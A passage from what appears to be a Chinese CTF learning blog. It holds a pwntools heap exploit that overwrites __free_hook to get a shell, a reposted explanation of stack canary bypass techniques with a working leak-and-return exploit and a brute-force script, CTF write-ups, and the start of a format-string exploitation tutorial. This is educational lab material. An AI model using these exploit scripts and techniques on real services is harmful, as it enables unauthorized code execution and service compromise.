class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, offset1, offset2, content</span>):</span><br>    choose(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Box ID: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Offset of msg: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(offset1).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Len of msg: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(offset2).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx, offset1, offset2</span>):</span><br>    choose(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Box ID: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Offset of msg: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(offset1).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;Len of msg: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(offset2).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Box ID: \n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br>add(<span class="hljs-number">0x420</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x420</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x420</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>sys = leak + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = leak + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>add(-<span class="hljs-number">4294963201</span>) <span class="hljs-comment">#2</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Key: \n&#x27;</span>)<br>key = p.recv(<span class="hljs-number">24</span>).strip().split(<span class="hljs-string">b&#x27; &#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    key[i] = <span class="hljs-built_in">int</span>(key[i], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(key)<br>key = key[<span class="hljs-number">0</span>] + (key[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>) + (key[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">16</span>) + (key[<span class="hljs-number">3</span>]&lt;&lt;<span class="hljs-number">24</span>) + (key[<span class="hljs-number">4</span>]&lt;&lt;<span class="hljs-number">32</span>) + (key[<span class="hljs-number">5</span>]&lt;&lt;<span class="hljs-number">40</span>) + (key[<span class="hljs-number">6</span>]&lt;&lt;<span class="hljs-number">48</span>) + (key[<span class="hljs-number">7</span>]&lt;&lt;<span class="hljs-number">56</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(key))<br>sys ^= key<br>edit(<span class="hljs-number">2</span>, free_hook, <span class="hljs-number">8</span>, p64(sys))<br><br>binsh = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>binsh_enc = <span class="hljs-string">b&#x27;&#x27;</span><br>add(<span class="hljs-number">0x420</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Key: \n&#x27;</span>)<br>key = p.recv(<span class="hljs-number">24</span>).strip().split(<span class="hljs-string">b&#x27; &#x27;</span>)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    key[i] = <span class="hljs-built_in">int</span>(key[i], <span class="hljs-number">16</span>)<br>    binsh_enc += p8(<span class="hljs-built_in">ord</span>(binsh[i]) ^ key[i])<br>edit(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, binsh_enc)<br><span class="hljs-comment"># debug()</span><br>free(<span class="hljs-number">3</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>canary绕过</title>
    <url>/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="转载自ctf-wiki"><a href="#转载自ctf-wiki" class="headerlink" title="转载自ctf wiki"></a>转载自ctf wiki</h2><h1 id="一、Canary"><a href="#一、Canary" class="headerlink" title="一、Canary"></a>一、Canary</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p>
<p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法(栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行(栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p>
<p>由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。</p>
<p>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</p>
<p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p>
<h2 id="Canary-原理"><a href="#Canary-原理" class="headerlink" title="Canary 原理"></a>Canary 原理</h2><h3 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h3><p>可以在 GCC 中使用以下参数设置 Canary:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-strong</span><br><span class="hljs-deletion">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="hljs-deletion">-fno-stack-protector 禁用保护</span><br></code></pre></td></tr></table></figure>

<h3 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h3><p>开启 Canary 保护的 stack 结构大概如下：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">  High<br>  Address |<span class="hljs-string">                 </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> args            </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> return address  </span>|<br>          +-----------------+<br>  rbp =&gt;  |<span class="hljs-string"> old ebp         </span>|<br>          +-----------------+<br>rbp-8 =&gt;  |<span class="hljs-string"> canary value    </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> local variables </span>|<br>  Low     |<span class="hljs-string">                 </span>|<br>  Address<br><br></code></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中ebp-0x8 的位置。<br>这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure>

<p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容(参见 stack smash)。</p>
<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-keyword">dtv_t</span> *dtv;<br>  <span class="hljs-keyword">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-keyword">int</span> multiple_threads;<br>  <span class="hljs-keyword">uintptr_t</span> sysinfo;<br>  <span class="hljs-keyword">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-keyword">tcbhead_t</span>;<br></code></pre></td></tr></table></figure>

<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p>
<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">security_init</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br>  <br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br><br></code></pre></td></tr></table></figure>


<h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p>
<h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。<br>泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。<br>这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p>
<h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// ex2.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getshell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>);<br>        <span class="hljs-built_in">printf</span>(buf);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    init();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello Hacker!&quot;</span>);<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ gcc -m32 -no-pie ex2.c -o ex2<br></code></pre></td></tr></table></figure>

<p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary<br>之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;ex2&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./ex2&#x27;</span>)<br><br>get_shell = ELF(<span class="hljs-string">&quot;./ex2&quot;</span>).sym[<span class="hljs-string">&quot;getshell&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)<br><br><span class="hljs-comment"># leak Canary</span><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span>)<br>Canary = u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># Bypass Canary</span><br>payload = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">100</span>+p32(Canary)+<span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">12</span>+p32(get_shell)<br>io.send(payload)<br><br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同(相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且<br>通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。<br>在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:<br>这是爆破的 Python 代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + <span class="hljs-built_in">chr</span>(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + <span class="hljs-built_in">chr</span>(i)<br>         <span class="hljs-comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(-<span class="hljs-number">1</span>)<br><br><br>canary = p[stop:start-<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure>


<h3 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>
<p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p>
<h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
<p>参见 StarCTF2018 babystack</p>
<h1 id="二、例题"><a href="#二、例题" class="headerlink" title="二、例题"></a>二、例题</h1><h3 id="pwn04——来自ctfshow的pwn入门"><a href="#pwn04——来自ctfshow的pwn入门" class="headerlink" title="pwn04——来自ctfshow的pwn入门"></a>pwn04——来自ctfshow的pwn入门</h3><p>checksec一下<img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155307.png"></p>
<p>开启了nx，canary，部分relro等保护措施，</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155500.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155325.png"></p>
<p>运行一下附件，发现可以把你输入的东西打印出来，还是重复两次，因此可以借此把canary泄露出来。（其实应该也看出来了吧，这里也有着很明显的字符串漏洞，所以还有一种解法就是去算canary的相对字符串的偏移，然后把它泄露出来）进入ida，函数很少，左边也能发现给出了系统函数，说明只要能正常覆盖返回地址就可以获取shell，点开buf进入栈中查看到canary的位置</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155329.png"></p>
<p>计算一下buf到var_c的偏移，覆盖到Var_C的最后一位数，因为是0x00会造成截断，所以一同覆盖，到时候减去覆盖的值就行了</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328161657.png"></p>
<p>其实这题貌似就是上面当做例题的题目，可能是出题人也读过ctf wiki并且照着样子出的，tql！</p>
<h3 id="Mary-Morton——来自攻防世界进阶区"><a href="#Mary-Morton——来自攻防世界进阶区" class="headerlink" title="Mary_Morton——来自攻防世界进阶区"></a>Mary_Morton——来自攻防世界进阶区</h3><p>checksec 一下，查看保护<img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328165236.png"></p>
<p>开启了部分relro，nx，canary</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328170729.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328180109.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328180112.png"></p>
<p>首先，主函数是个无限的循环结构，不停的可以进入三个分支，在第二个分支中有着字符串漏洞，第三个分支中有着栈溢出漏洞，如果只是简单处理，那就是先用字符串漏洞泄露canary的值，再用栈溢出进行跳转获取flag</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328175843.png"></p>
<p>在gdb中断点到printf中可以算出，canary是栈上的第18个变量，以及64位传参中前六个是寄存器传参，所以canary相对于字符串是第23个参数，也就是要写成%23$p，然后就正常算栈溢出偏移即可。exp如下：</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328185226.png"></p>
<p>但是我在攻防世界的wp中看见，有个大佬还拥有其他两个方式，方式1:输入2，利用格式化字符串将printf的got地址修改为system的plt地址，再次输入2，输入’/bin/sh\x00’，相当于执行system(‘/bin/sh\x00’)方式2:输入2，利用格式化字符串将exit的got地址修改为sub_4008DA函数地址（该函数可以直接执行cat./flag）,再次输入3，调用sub_4008DA函数catflag。详细可以到攻防世界自行查看，到大佬tql！！！！！！</p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞利用</title>
    <url>/2021/03/27/2021-03-27-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="转载自ctf-wiki"><a href="#转载自ctf-wiki" class="headerlink" title="转载自ctf-wiki"></a>转载自ctf-wiki</h1><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p>
<ul>
<li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大。</li>
<li>查看进程内容，根据%d，%f输出了栈上的内容。</li>
</ul>
<p>下面我们会对于每一方面进行更加详细的解释。</p>
<h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个%s即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></td></tr></table></figure>

<p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
<ul>
<li>泄露栈内存<ul>
<li>  获取某个变量的值</li>
<li>  获取某个变量对应地址的内存</li>
</ul>
</li>
<li>泄露任意地址内存<ul>
<li>  利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li>
<li>  盲打，dump整个程序，获取有用信息。</li>
</ul>
</li>
</ul>
<h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><p>例如，给定如下程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后，我们简单编译一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c<br>leakmemory.c: In function ‘main’:<br>leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]<br>   printf(s);<br>          ^<br></code></pre></td></tr></table></figure>

<p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。下面，我们来看一下，如何获取对应的栈内存。</p>
<p>根据C语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数(64位会根据其传参的规则进行获取)。这里我们主要介绍32位。</p>
<h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ffcfc400.000000c2.f765a6bb<br></code></pre></td></tr></table></figure>

